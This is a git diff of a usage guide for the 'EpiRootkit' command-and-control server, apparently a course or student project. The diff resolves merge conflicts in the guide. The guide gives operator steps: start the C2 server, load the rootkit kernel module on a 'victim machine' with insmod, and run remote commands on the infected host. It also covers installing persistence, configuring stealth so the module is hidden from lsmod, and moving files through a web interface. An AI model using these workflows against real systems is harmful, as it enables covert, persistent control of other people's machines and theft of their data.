@@ -9,11 +9,7 @@ toc: true
 weight: 304
 ---
 
-<<<<<<< HEAD
-## Running the Server & Web UI
-=======
 # Usage Guide
->>>>>>> d8205ef9e1984d8455d84e1cada77692ef2857c0
 
 Complete workflows and usage scenarios for the EpiRootkit C2 server.
 
@@ -21,23 +17,18 @@ Complete workflows and usage scenarios for the EpiRootkit C2 server.
 
 ### 1. Start the C2 Server
 ```bash
-<<<<<<< HEAD
+cd attacking_program
 pnpm start
 ```
 
 This command starts both the C2 server and the Web UI. The CLI prompt (`c2-server$ `) will appear for server management, and the Web UI will be available at [http://localhost:3000](http://localhost:3000) by default.
 
 Real-time event logs appear in the console, providing visual alerts for significant events such as client connections and disconnections.
-=======
-cd attacking_program
-pnpm start
-```
 
 ### 2. Wait for Rootkit Connection
 ```bash
 # On victim machine
 sudo insmod epirootkit.ko
->>>>>>> d8205ef9e1984d8455d84e1cada77692ef2857c0
 
 # C2 server will show:
 ┌─ Client-1
@@ -110,9 +101,7 @@ c2-server$ exec Client-1 uname -a
   • [2025-05-25 16:13:33] Command result:
   • Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 └─
-
 ```
-
 
 ### File Transfer Workflow
 
@@ -176,7 +165,6 @@ c2-server$ persist Client-1 install modules
 └─
 ```
 
-
 ### Stealth Configuration
 
 #### Interactive Configuration
@@ -212,4 +200,19 @@ c2-server$ status Client-1
 c2-server$ exec Client-1 lsmod | grep epirootkit
 # (should show no output if hidden)
 ```
+
+## Web UI Usage
+
+### Access Web Interface
+1. Open browser to `http://localhost:3000`
+2. Login with the configured password
+3. View connected clients in real-time
+4. Execute commands through the web interface
+5. Monitor client status and logs
+
+### Key Features
+- **Real-time Updates**: Client status updates automatically
+- **Command History**: View previous commands and results
+- **File Operations**: Upload/download files through web interface
+- **Authentication Management**: Handle client authentication securely
 
